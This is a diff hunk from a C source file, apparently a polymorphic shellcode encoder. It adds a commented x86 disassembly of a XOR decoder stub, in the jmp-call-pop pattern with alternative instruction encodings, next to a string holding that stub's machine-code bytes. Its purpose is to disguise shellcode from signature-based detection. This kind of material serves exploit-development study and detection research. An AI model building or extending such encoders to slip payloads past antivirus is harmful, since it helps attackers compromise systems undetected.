@@ -39,6 +39,28 @@ char* encode(char *shellcode, char key) {
 }
 
 char* polymorphicDecoder(char key, int codeLength) {
+/*
+ 8048060:	eb 1e		;!;	Set to correct memory!
+ 8048062:	90		;7;	...
+ 8048063:	5e
+ 8048064:	31 c0		;1;	6a aa
+ 8048066:	b0 aa		;1;	58
+ 8048068:	31 c9		;2;	6a aa
+ 804806a:	b1 aa		;2;	59
+ 804806c:	8a 1e		;3;	8a 16
+ 804806e:	32 06		;4;	30 06
+ 8048070:	88 06		;4;	...
+ 8048072:	88 da		;3;	88 d3
+ 8048074:	83 c6 01	;5;	46
+ 8048077:	8a 1e		;3;	8a 16
+ 8048079:	30 16		;3;	30 1e
+ 804807b:	49		;6;	e2 f7
+ 804807c:	75 f4		;6;	...
+ 804807e:	eb 06		;8;	eb 05
+ 8048080:	90		;8;	...
+ 8048081:	e8 dc ff ff ff	;!;	Set to correct memory!
+*/
+
 	static char stub[] = \
 	"\xeb\x16\x5e\x6a\xaa\x58\x6a\xaa\x59\x8a\x16\x30\x06\x88\xd3\x46\x8a\x16\x30\x1e\xe2\xf7\xeb\x05\xe8\xe5\xff\xff\xff";
 
